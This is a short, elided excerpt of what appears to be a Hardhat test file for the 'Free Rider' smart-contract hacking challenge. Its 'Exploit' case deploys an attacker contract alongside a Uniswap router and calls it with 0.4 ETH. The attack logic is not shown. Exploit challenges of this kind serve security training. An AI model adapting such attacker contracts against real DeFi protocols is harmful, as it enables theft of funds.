...
describe("[Challenge] Free Rider", function () {
  ...
  it("Exploit", async function () {
    ...
    const attacker_helper = await (
      await ethers.getContractFactory("FreeRiderV2Attacker", attacker)
    ).deploy(
      this.uniswapRouter.address,
    ...
    await attacker_helper.execute({ value: ethers.utils.parseEther("0.4") });
  });
